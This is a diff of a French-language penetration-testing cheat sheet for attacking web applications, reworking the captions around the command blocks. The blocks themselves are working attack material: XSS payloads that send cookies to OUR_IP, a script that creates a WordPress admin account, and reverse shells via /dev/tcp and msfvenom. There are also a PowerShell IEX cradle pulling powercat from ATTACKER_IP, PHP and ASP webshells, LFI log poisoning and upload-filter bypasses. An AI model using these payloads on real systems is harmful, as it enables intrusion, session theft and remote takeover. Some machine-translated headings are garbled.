@@ -8,15 +8,10 @@ description: "Examiner les fonctionnalités, entrées et configurations des appl
 Examiner les fonctionnalités, entrées et configurations des applications web.
 
 
-## Énumération
-
-Commandes, paramètres et exemples associés à cette technique.
+### Identification des technologies
 
 
-### FingerPrinting
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `whatweb` pour la rubrique « Identification des technologies ».
 
 ```bash
 # Detect technologies used by the target website
@@ -35,6 +30,8 @@ openssl s_client -connect <target_domain>:443
 ```
 
 
+Récupérer une ressource distante ou une réponse HTTP.
+
 ```bash
 # When discovering an HTTP website, test various HTTP methods to identify potential vulnerabilities. Use the following command to enumerate allowed methods:
 curl -X OPTIONS http://[TARGET_IP] -i
@@ -43,6 +40,8 @@ curl -X OPTIONS http://[TARGET_IP] -i
 curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"
 ```
 
+
+Commande `wappalyzer` pour la rubrique « Identification des technologies ».
 
 ```bash
 # Use Wappalyzer to identify technologies and frameworks
@@ -56,15 +55,10 @@ curl -I http://[TARGET_IP]
 ```
 
 
-### Directory Discovery
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### FFUF
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic directory fuzzing
@@ -102,8 +96,8 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
 
 #### DIRB
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic directory scanning
@@ -134,8 +128,8 @@ dirb http://target.com
 
 #### GOBUSTER
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic directory scanning
@@ -164,8 +158,8 @@ gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directo
 
 #### FEROXBUSTER
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic directory fuzzing
@@ -182,8 +176,8 @@ feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list
 
 #### DIRSEARCH
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic directory scanning
@@ -218,8 +212,8 @@ dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowerc
 
 #### WFUZZ
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Find available directories
@@ -245,15 +239,10 @@ wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/direc
 ```
 
 
-### File Discovery
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### FFUF
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic file fuzzing
@@ -278,8 +267,8 @@ ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
 
 #### DIRB
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic file scanning with default extensions
@@ -301,8 +290,8 @@ dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
 
 #### GOBUSTER
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic file scanning
@@ -327,8 +316,8 @@ gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 
 #### FEROXBUSTER
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic file scanning
@@ -359,8 +348,8 @@ feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"
 
 #### DIRSEARCH
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # Basic file scanning
@@ -383,15 +372,14 @@ dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
 ```
 
 
-### Git Exposed
-
-Commandes, paramètres et exemples associés à cette technique.
+### Dépôt Git exposé
 
 
-```text
-.git
-```
+**Paramètres et repères :**
+`.git` (métadonnées Git)  
 
+
+Commande `git-dumper` pour la rubrique « Dépôt Git exposé ».
 
 ```bash
 # Dump the contents of an exposed .git directory
@@ -412,15 +400,11 @@ git show [commitID]
 ```
 
 
-```text
-gitdumper.sh
-```
+**Paramètres et repères :**
+`gitdumper.sh` · `extractor.sh`  
 
 
-```text
-extractor.sh
-```
-
+Commande `./gitdumper.sh` pour la rubrique « Dépôt Git exposé ».
 
 ```bash
 ./gitdumper.sh http://[domain].com/.git/ /path/to/save/git
@@ -444,11 +428,15 @@ git reset --hard
 Examiner les entrées et les réponses de l'application web.
 
 
+Commande `wpscan` pour la rubrique « CMS ».
+
 ```bash
 # Basic WordPress scan
 wpscan --url http://$IP/wp/
 ```
 
+
+Commande `wpscan` pour la rubrique « CMS ».
 
 ```bash
 # Brute forcing WordPress login
@@ -456,10 +444,14 @@ wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlist
 ```
 
 
+Commande `wpscan` pour la rubrique « CMS ».
+
 ```bash
 wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"
 ```
 
+
+Commande `wpscan` pour la rubrique « CMS ».
 
 ```bash
 wpscan -u "http://<IP>/" --enumerate u
@@ -468,6 +460,8 @@ wpscan -u "http://<IP>/" --enumerate u
 wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
 ```
 
+
+Commande `https` pour la rubrique « CMS ».
 
 ```bash
 # Using a malicious WordPress plugin
@@ -481,11 +475,15 @@ python3 wordpwn.py 192.168.119.140 443 Y
 ```
 
 
+Commande `droopescan` pour la rubrique « CMS ».
+
 ```bash
 # Scan Drupal CMS
 droopescan scan drupal -u [TARGET_URL]
 ```
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 # Download the .git directory if exposed
@@ -498,6 +496,8 @@ cd [TARGET_IP]
 sudo git show
 ```
 
+
+Exemple technique pour la rubrique « CMS ».
 
 ```text
 # Location and version info
@@ -513,10 +513,14 @@ https://www.exploit-db.com/exploits/48979
 ```
 
 
+Commande `cewl` pour la rubrique « CMS ».
+
 ```bash
 cewl -w <dictionary-file> "http://<IP>/" --with-numbers
 ```
 
+
+Commande `wpscan` pour la rubrique « CMS ».
 
 ```bash
 # Detect vulnerable plugins
@@ -535,6 +539,8 @@ wpscan --url http(s)://<IP>/ --enumerate p --plugins-detection aggressive
 Examiner les entrées et les réponses de l'application web.
 
 
+Commande `80/tcp` pour la rubrique « WebDav ».
+
 ```bash
 80/tcp    open  http          Microsoft IIS httpd 10.0
 | http-webdav-scan:
@@ -543,26 +549,36 @@ Examiner les entrées et les réponses de l'application web.
 ```
 
 
+Commande `cadaver` pour la rubrique « WebDav ».
+
 ```bash
 # Use cadaver
 cadaver [IP]
 ```
 
 
+Commande `msfvenom` pour la rubrique « WebDav ».
+
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
 ```
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
 ```
 
 
+Tester ou établir une connexion réseau avec Netcat.
+
 ```bash
 nc -nvlp 80
 ```
 
+
+Commande `http` pour la rubrique « WebDav ».
 
 ```text
 http://$VictimIP/shell.aspx
@@ -571,8 +587,8 @@ http://$VictimIP/shell.aspx
 
 ### APIs
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 # Basic API exploration
@@ -606,28 +622,33 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 
 ### Listes de mots
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Listes de mots ».
 
 ```text
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 
+Exemple technique pour la rubrique « Listes de mots ».
+
 ```text
 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 ```
 
+
+Exemple technique pour la rubrique « Listes de mots ».
 
 ```text
 /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
 
-```text
-/usr/share/seclists/Discovery/Web-Content/big.txt
-```
+**Paramètres et repères :**
+`/usr/share/seclists/Discovery/Web-Content/big.txt`  
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 # Get the website content
@@ -637,7 +658,7 @@ curl http://example.com > example.txt
 
 # Crate the dictionary
 html2dic example.txt
-or
+# Autre possibilité
 cewl -w createWordlist.txt https://www.example.com
 
 # Improve the wordlist with rules
@@ -652,8 +673,8 @@ Examiner les entrées et les réponses de l'application web.
 
 ### Theory
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Theory ».
 
 ```text
 < > ' " { } ;
@@ -671,8 +692,8 @@ Commandes, paramètres et exemples associés à cette technique.
 
 ### Stored
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Stored ».
 
 ```html
 # Text to save to the application.
@@ -686,24 +707,22 @@ Commandes, paramètres et exemples associés à cette technique.
 
 ### Reflected
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « Reflected ».
 
 ```bash
 http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
 ```
 
-
 ![Reflected XSS Payload](https://www.emmanuelsolis.com/img/xss01.png)
-
 
 ![Reflected XSS Result](https://www.emmanuelsolis.com/img/xss02.png)
 
 
 ### Blind
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Blind ».
 
 ```html
 <script src=http://[OUR_IP]></script>
@@ -720,19 +739,21 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 
 ### PrivEsc Using Session Hijacking
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `document.location` pour la rubrique « PrivEsc Using Session Hijacking ».
 
 ```html
 # Possible Payloads
 document.location='http://OUR_IP/index.php?c='+document.cookie;
-or
+# Autre possibilité
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 
 # Access the Host
 <script src=http://OUR_IP>/script.js</script>
 ```
 
+
+Exemple technique pour la rubrique « PrivEsc Using Session Hijacking ».
 
 ```php
 # Payload
@@ -758,6 +779,8 @@ if (isset($_GET['c'])) {
 Examiner les entrées et les réponses de l'application web.
 
 
+Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
+
 ```php
 var request = new XMLHttpRequest();
 var targetURL = "/wp-admin/user-new.php";
@@ -769,14 +792,7 @@ var nonce = match[1];
 ```
 
 
-```php
-var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
-var request = new XMLHttpRequest();
-request.open("POST", targetURL, true);
-request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-request.send(params);
-```
-
+Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
 
 ```php
 var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
@@ -786,6 +802,19 @@ request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 request.send(params);
 ```
 
+
+Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
+
+```php
+var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
+var request = new XMLHttpRequest();
+request.open("POST", targetURL, true);
+request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+request.send(params);
+```
+
+
+Commande `function` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
 
 ```javascript
 function toJavaScriptEncoding(str) {
@@ -804,20 +833,21 @@ console.log(encodedPayload);
 ```
 
 
-```text
-eval
-```
+**Paramètres et repères :**
+`eval`  
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
 ```
 
 
-### Automated Discovery
+### Automated Découverte
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `git` pour la rubrique « Automated Découverte ».
 
 ```bash
 git clone https://github.com/s0md3v/XSStrike.git
@@ -828,10 +858,11 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 ```
 
 
-```text
-user-agent
-```
+**Paramètres et repères :**
+`user-agent`  
 
+
+Rechercher des chemins ou paramètres web.
 
 ```bash
 # [xss.req] is the request captured from BurpSuite.
@@ -851,43 +882,51 @@ Examiner les entrées et les réponses de l'application web.
 
 #### Détection de LFI
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « Détection de LFI ».
 
 ```text
 http://<target_url>/file.php?recurse=<file_name>
 ```
 
 
+Rechercher des chemins ou paramètres web.
+
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
 ```
 
 
-```text
-GET
-```
+**Paramètres et repères :**
+`GET`  
 
+
+Rechercher des chemins ou paramètres web.
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 ```
 
 
+Rechercher des chemins ou paramètres web.
+
 ```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 ```
 
 
-```text
-../../../../
-```
+**Paramètres et repères :**
+`../../../../`  
 
+
+Rechercher des chemins ou paramètres web.
 
 ```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 ```
 
+
+Rechercher des chemins ou paramètres web.
 
 ```bash
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
@@ -896,8 +935,8 @@ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?langua
 
 #### Bypassing LFI Protections
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « Bypassing LFI Protections ».
 
 ```bash
 # URL encoding bypass
@@ -930,8 +969,8 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 
 #### LFI Wrappers
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « LFI Wrappers ».
 
 ```bash
 http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
@@ -941,45 +980,42 @@ echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 ```
 
 
+Commande `http` pour la rubrique « LFI Wrappers ».
+
 ```bash
 http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
 ```
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
 ```
 
 
-#### Remote Code Execution via LFI
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ##### Log Poisoning (Apache or SSH Logs)
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`/var/log/apache2/access.log` · `/var/log/auth.log`  
 
 
-```text
-/var/log/apache2/access.log
-```
-
-
-```text
-/var/log/auth.log
-```
-
+Commande `http` pour la rubrique « Log Poisoning (Apache or SSH Logs) ».
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
 ```
 
 
+Exécuter une commande distante via SSH.
+
 ```bash
 ssh "<?php system('whoami'); ?>"@<target>
 ```
 
+
+Commande `http` pour la rubrique « Log Poisoning (Apache or SSH Logs) ».
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
@@ -991,15 +1027,18 @@ http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
 Examiner les entrées et les réponses de l'application web.
 
 
-```text
-/etc/passwd
-```
+**Paramètres et repères :**
+`/etc/passwd`  
 
+
+Commande `telnet` pour la rubrique « Mail PHP Execution (RCE via Email) ».
 
 ```bash
 telnet <target_ip> 25
 ```
 
+
+Commande `helo` pour la rubrique « Mail PHP Execution (RCE via Email) ».
 
 ```bash
 HELO localhost
@@ -1011,6 +1050,8 @@ DATA
 ```
 
 
+Commande `smtp-user-enum` pour la rubrique « Mail PHP Execution (RCE via Email) ».
+
 ```bash
 smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
 ```
@@ -1018,18 +1059,19 @@ smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
 
 #### Reverse Shell via LFI
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`/proc/self/environ`  
 
 
-```text
-/proc/self/environ
-```
-
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 ```
 
+
+Commande `http` pour la rubrique « Reverse Shell via LFI ».
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../proc/self/environ
@@ -1038,13 +1080,15 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 
 #### Outils utiles
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `git` pour la rubrique « Outils utiles ».
 
 ```bash
 git clone https://github.com/D35m0nd142/LFISuite
 ```
 
+
+Commande `python` pour la rubrique « Outils utiles ».
 
 ```bash
 python rfiscanner.py <target_url>
@@ -1056,10 +1100,10 @@ python rfiscanner.py <target_url>
 Examiner les entrées et les réponses de l'application web.
 
 
-#### Basic RFI Example
+#### De base RFI Example
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « De base RFI Example ».
 
 ```bash
 # This assumes the server's allow_url_fopen or allow_url_include settings are enabled.
@@ -1069,18 +1113,19 @@ http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
 
 #### Reverse Shell via RFI
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `python3` pour la rubrique « Reverse Shell via RFI ».
 
 ```bash
 python3 -m http.server 80
 ```
 
 
-```text
-revshell.php
-```
+**Paramètres et repères :**
+`revshell.php`  
 
+
+Exemple technique pour la rubrique « Reverse Shell via RFI ».
 
 ```bash
 # Option 1: Reverse Shell via PHP
@@ -1091,6 +1136,8 @@ bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
 ```
 
 
+Récupérer une ressource distante ou une réponse HTTP.
+
 ```bash
 curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 ```
@@ -1098,33 +1145,24 @@ curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 
 ### WordPress Plugin for Reverse Shell
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « WordPress Plugin for Reverse Shell ».
 
 ```text
 http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]
 ```
 
 
-```text
-multi-os-php-reverse-shell.php
-```
-
-
-#### Malicious WordPress Plugin Generators
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
-#### Reverse Shell Options
-
-Commandes, paramètres et exemples associés à cette technique.
+**Paramètres et repères :**
+`multi-os-php-reverse-shell.php`  
 
 
 #### PHP Webshell
 
 Examiner les entrées et les réponses de l'application web.
 
+
+Exemple technique pour la rubrique « PHP Webshell ».
 
 ```php
 <?php system($_GET['cmd']); ?>
@@ -1136,6 +1174,8 @@ Examiner les entrées et les réponses de l'application web.
 Examiner les entrées et les réponses de l'application web.
 
 
+Exemple technique pour la rubrique « ASP Webshell ».
+
 ```text
 <% eval request('cmd') %>
 ```
@@ -1146,20 +1186,19 @@ Examiner les entrées et les réponses de l'application web.
 Vérifier les ports et les services de la cible autorisée.
 
 
+Commande `msfvenom` pour la rubrique « Non-Meterpreter Payload for Netcat ».
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
 ```
-
-
-### Files and Paths to Target (LFI & RFI)
-
-Commandes, paramètres et exemples associés à cette technique.
 
 
 #### Fichiers Linux courants
 
 Examiner les permissions et la configuration de Linux.
 
+
+Commande `/etc/passwd` pour la rubrique « Fichiers Linux courants ».
 
 ```bash
 # Popular Files
@@ -1196,6 +1235,8 @@ Examiner les permissions et la configuration de Linux.
 
 Observer les permissions et la configuration de Windows.
 
+
+Commande `c` pour la rubrique « Fichiers Windows courants ».
 
 ```bash
 # Popular Files
@@ -1289,10 +1330,11 @@ C:\xampp\tomcat\conf\server.xml
 Examiner les entrées et les réponses de l'application web.
 
 
-```text
-php://filter
-```
+**Paramètres et repères :**
+`php://filter`  
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -1302,10 +1344,11 @@ echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 ```
 
 
-```text
-php://data
-```
+**Paramètres et repères :**
+`php://data`  
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"
@@ -1320,15 +1363,21 @@ echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
 Examiner les entrées et les réponses de l'application web.
 
 
+Exemple technique pour la rubrique « OS Command Injection ».
+
 ```powershell
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
 
+Commande `iex` pour la rubrique « OS Command Injection ».
+
 ```powershell
 IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell
 ```
 
+
+Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
@@ -1340,35 +1389,18 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 Examiner les entrées et les réponses de l'application web.
 
 
-```text
-.php
-```
-
-
-```text
-.aspx
-```
-
-
-### Disabling Frontend Validation
-
-Commandes, paramètres et exemples associés à cette technique.
+**Paramètres et repères :**
+`.php` · `.aspx`  
 
 
 ### Extensions Blacklist
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`ffuf` · `BurpSuite`  
 
 
-```bash
-ffuf
-```
-
-
-```text
-BurpSuite
-```
-
+Commande `.jpeg.php` pour la rubrique « Extensions Blacklist ».
 
 ```text
 .jpeg.php
@@ -1397,8 +1429,8 @@ BurpSuite
 
 ### Extensions Whitelist
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Extensions Whitelist ».
 
 ```bash
 # This only checks if the whitelist are there in the file upload and not if it ends with it.
@@ -1413,8 +1445,8 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 
 ### Bypassing Filters
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `.php` pour la rubrique « Bypassing Filters ».
 
 ```text
 # For PHP
@@ -1425,25 +1457,22 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
-```text
-.htaccess
-```
+**Paramètres et repères :**
+`.htaccess`  
 
 
-```text
-.htaccess
-```
-
+Commande `addtype` pour la rubrique « Bypassing Filters ».
 
 ```text
 AddType application/x-httpd-php .dork
 ```
 
 
-```text
-.dork
-```
+**Paramètres et repères :**
+`.dork`  
 
+
+Commande `echo` pour la rubrique « Bypassing Filters ».
 
 ```bash
 # We can now upload [file].dork files.
@@ -1451,15 +1480,11 @@ echo "AddType application/x-httpd-php .dork" > .htaccess
 ```
 
 
-```text
-shell.php.jpg
-```
+**Paramètres et repères :**
+`shell.php.jpg` · `shell.php.jpeg`  
 
 
-```text
-shell.php.jpeg
-```
-
+Commande `if` pour la rubrique « Bypassing Filters ».
 
 ```bash
 # This checks if it ends with it so double extension wont work.
@@ -1467,10 +1492,14 @@ if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 ```
 
 
+Commande `shell.php` pour la rubrique « Bypassing Filters ».
+
 ```text
 shell.php%00.jpg
 ```
 
+
+Exemple technique pour la rubrique « Bypassing Filters ».
 
 ```text
 # For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.
@@ -1486,6 +1515,8 @@ shell.php%00.jpg
 ```
 
 
+Commande `for` pour la rubrique « Bypassing Filters ».
+
 ```bash
 # Script for all permutations
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
@@ -1498,6 +1529,8 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
 done
 ```
 
+
+Commande `gif89a` pour la rubrique « Bypassing Filters ».
 
 ```php
 # Payload code
@@ -1512,6 +1545,8 @@ system($_GET['cmd']); //or you can insert your complete shell code
 ?>
 ```
 
+
+Commande `echo` pour la rubrique « Bypassing Filters ».
 
 ```bash
 # Example
@@ -1529,31 +1564,29 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 }
 ```
 
-
 ![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)
 
 
 ### File Execution
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « File Execution ».
 
 ```bash
 http://[TARGET_IP]/uploads/shell.php
-or
+# Autre possibilité
 http://[TARGET_IP]/uploads/shell.php?cmd=whoami
 ```
 
 
 ### Embed Code into Images
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`exiftool`  
 
 
-```text
-exiftool
-```
-
+Commande `exiftool` pour la rubrique « Embed Code into Images ».
 
 ```bash
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
@@ -1564,23 +1597,26 @@ mv lo.jpg lo.php.jpg
 
 ### Embed Code into File Names
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `file` pour la rubrique « Embed Code into File Names ».
 
 ```text
 file$(whoami).jpg
 ```
 
 
-```text
-whoami.jpg
-```
+**Paramètres et repères :**
+`whoami.jpg`  
 
+
+Commande `file.jpg` pour la rubrique « Embed Code into File Names ».
 
 ```text
 file.jpg||whoami
 ```
 
+
+Commande `echo` pour la rubrique « Embed Code into File Names ».
 
 ```text
 # Crate the Base64 encoded command.
@@ -1596,11 +1632,6 @@ cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-### Tools for Connecting Usage
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### MySQL for MySQL (Linux)
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
@@ -1608,8 +1639,8 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ##### Connexion initiale
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `mysql` pour la rubrique « Connexion initiale ».
 
 ```bash
 mysql -u <username> -p -h <host>
@@ -1620,18 +1651,22 @@ mysql -u <username> -p -h <host>
 
 ##### Requêtes courantes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Requêtes courantes ».
 
 ```sql
 SELECT VERSION();
 ```
 
 
+Commande `show` pour la rubrique « Requêtes courantes ».
+
 ```sql
 SHOW DATABASES;
 ```
 
+
+Commande `use` pour la rubrique « Requêtes courantes ».
 
 ```sql
 USE <database_name>;
@@ -1640,13 +1675,15 @@ USE <database_name>;
 
 ##### Enumerating Tables and Columns
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `show` pour la rubrique « Enumerating Tables and Columns ».
 
 ```sql
 SHOW TABLES;
 ```
 
+
+Commande `show` pour la rubrique « Enumerating Tables and Columns ».
 
 ```sql
 SHOW COLUMNS FROM <table_name>;
@@ -1655,13 +1692,15 @@ SHOW COLUMNS FROM <table_name>;
 
 ##### Énumération des utilisateurs and Privileges
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».
 
 ```sql
 SELECT User, Host FROM mysql.user;
 ```
 
+
+Commande `show` pour la rubrique « Énumération des utilisateurs and Privileges ».
 
 ```sql
 SHOW GRANTS FOR '<username>'@'<host>';
@@ -1670,8 +1709,8 @@ SHOW GRANTS FOR '<username>'@'<host>';
 
 ##### Data Extraction
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Data Extraction ».
 
 ```sql
 SELECT * FROM <table_name> LIMIT <number_of_rows>;
@@ -1680,18 +1719,22 @@ SELECT * FROM <table_name> LIMIT <number_of_rows>;
 
